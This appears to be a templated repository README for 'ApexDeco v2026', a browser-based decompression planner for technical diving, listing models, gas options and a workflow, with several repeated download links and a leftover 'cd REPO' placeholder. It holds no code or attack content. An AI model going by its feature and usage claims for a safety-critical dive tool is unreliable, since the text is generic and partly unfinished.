# ApexDeco v2026 - Technical Diving Decompression Planner 2026

> **ApexDeco is a browser-based decompression planning tool for technical dives using mixed gas, open-circuit, and CCR workflows. Version 2026 is now available.**

[![Platform](https://img.shields.io/badge/Platform-Web%20browser-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/gabelorenz36/apexdeco-dive-planner-2026?style=flat-square)](https://github.com/gabelorenz36/apexdeco-dive-planner-2026)

---

<p align="center">
  <a href="https://gabelorenz36.github.io/apexdeco-dive-planner-2026/">
    <img src="https://img.shields.io/badge/Download-ApexDeco%20Latest-brightgreen?style=for-the-badge" alt="Download ApexDeco">
  </a>
</p>

> **[Download ApexDeco v2026](https://gabelorenz36.github.io/apexdeco-dive-planner-2026/)**

---

[Download Latest Build](https://gabelorenz36.github.io/apexdeco-dive-planner-2026/)

---

## Overview

ApexDeco is a static web application for preparing technical dive plans with air, nitrox, trimix, and other mixed-gas combinations. It covers both open-circuit and closed-circuit rebreather use, allowing decompression profiles and supporting gas data to be examined directly in a browser.

Its calculation engine combines Buhlmann ZHL-16C, gradient factors, and multiple VPM model variants. The application also supports multi-level profiles, tissue carry-over between segments, bailout planning, gas-switch validation, interactive profile charts, and plain-text plan exports.

---

## Capabilities

- Plan dives using air, nitrox, trimix, and other mixed gases
- Create profiles for open-circuit equipment and closed-circuit rebreathers
- Apply Buhlmann ZHL-16C decompression calculations with gradient factors
- Select VPM-A, VPM-B, VPM-B/E, or VPM-B/GFS
- Define multi-level dives while carrying tissue state between segments
- Examine gas consumption, OTU, and CNS results
- Include bailout gases and check gas-switch data
- View dive profiles with interactive charts
- Save completed plans as plain text
- Use the planner as a static application in a web browser

---

## Getting Started

### Hosted version

Open the current browser build here:

[Launch ApexDeco v2026](https://gabelorenz36.github.io/apexdeco-dive-planner-2026/)

### Local checkout

Clone the repository, then move into the project directory:

```bash
git clone https://github.com/gabelorenz36/apexdeco-dive-planner-2026.git
cd REPO
```

ApexDeco is static, so you can run the checked-out files through a local static server or open the primary HTML entry point in a compatible browser.

---

## Planning Workflow

1. Open ApexDeco in a modern web browser.
2. Choose either the open-circuit or CCR planning workflow.
3. Provide the dive depth, planned levels, and gas mixes.
4. Select a decompression model and configure the applicable gradient-factor or VPM options.
5. Examine decompression stops, tissue carry-over, gas consumption, OTU, and CNS values.
6. Review bailout and gas-switch details when they apply.
7. Use the interactive chart to inspect the resulting profile.
8. Export the finished plan to plain text if you need a portable version.

ApexDeco is intended as a planning aid. Carefully review its output and follow the procedures, training, equipment requirements, and operating limits appropriate to the dive.

---

## Planning Settings

No server-side configuration file is required. The browser interface provides the planning inputs, including:

- Gas choices and switch points
- Dive depth and multi-level profile information
- Open-circuit or CCR mode
- Buhlmann gradient factors
- VPM model choice
- Bailout parameters

Change the relevant controls in the application to recalculate the profile and associated gas metrics.

---

## Requirements

- A current web browser
- A device that can display interactive browser content
- Static hosting or a local static server when deploying the application
- Enough screen area to inspect charts and planning information

ApexDeco is delivered as an HTML-based static application and has no dedicated backend runtime requirement.

---

## Frequently Asked Questions

### Does ApexDeco need to be installed as a desktop program?

No. It runs in a browser as a static application. You can use the hosted build or serve a local repository checkout.

### Which decompression calculations can I select?

Available options include Buhlmann ZHL-16C with gradient factors and the VPM-A, VPM-B, VPM-B/E, and VPM-B/GFS variants.

### Are both open-circuit and CCR planning supported?

Yes. ApexDeco provides workflows for open-circuit dives and closed-circuit rebreathers, with bailout planning included.

### What gas types can be entered?

The planner accepts air, nitrox, trimix, and other mixed-gas inputs.

### Is there an export option?

Yes. Finished plans can be exported in plain-text format.

### What can I check if the chart or results fail to refresh?

Reload the application and confirm the profile, gas mixes, decompression model, and gas-switch entries. If the problem remains, recreate it using the fewest inputs possible and submit the details through the repository issue tracker.

### Where do updates appear?

Project updates are distributed through the repository and hosted build. Before beginning a new planning workflow, check the newest release or build.

---

## Future Work

- Further refine profile display and plan-review workflows
- Continue enhancing mixed-gas and bailout data entry
- Add more documentation for the available calculation models
- Improve the layout and presentation of exported plans

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
